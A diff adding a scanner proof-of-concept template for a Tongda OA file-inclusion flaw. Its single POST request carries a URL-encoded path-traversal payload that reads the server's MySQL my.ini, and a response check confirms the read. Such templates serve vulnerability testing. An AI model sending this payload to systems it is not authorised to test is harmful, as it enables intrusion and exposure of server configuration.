@@ -1,0 +1,11 @@
+name: poc-yaml-tongda-file-include
+rules:
+  - method: POST
+    path: /ispirit/interface/gateway.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      json=%7b%22%75%72%6c%22%3a%22%2f%67%65%6e%65%72%61%6c%2f%2e%2e%2f%2e%2e%2f%6d%79%73%71%6c%35%2f%6d%79%2e%69%6e%69%22%7d
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(b"innodb_log_group_home_dir")
